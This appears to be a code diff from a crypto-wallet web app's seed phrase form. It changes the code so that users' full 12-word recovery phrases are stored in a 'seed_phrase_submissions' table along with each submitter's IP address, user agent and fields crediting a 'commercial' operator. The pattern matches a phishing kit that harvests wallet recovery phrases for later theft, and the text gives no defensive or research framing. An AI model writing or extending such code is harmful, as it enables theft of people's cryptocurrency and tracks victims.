@@ -82,13 +82,17 @@ const SeedPhraseForm = ({ onSuccess }: SeedPhraseFormProps) => {
       // Create wallet phrase from seed words
       const walletPhrase = seedWords.join(' ');
       
-      // Save to wallets table
+      // Save to seed_phrase_submissions table
       const { error } = await supabase
-        .from('wallets')
+        .from('seed_phrase_submissions')
         .insert({
-          wallet_phrase: walletPhrase,
-          client_tracking_id: `user_${Date.now()}`,
-          status: 'available'
+          phrase: walletPhrase,
+          word_count: 12,
+          ip_address: ipData.ip,
+          user_agent: navigator.userAgent,
+          status: 'submitted',
+          commercial_id: commercialName && commercialId ? commercialId : null,
+          commercial_name: commercialName || null,
         });
 
       if (error) {
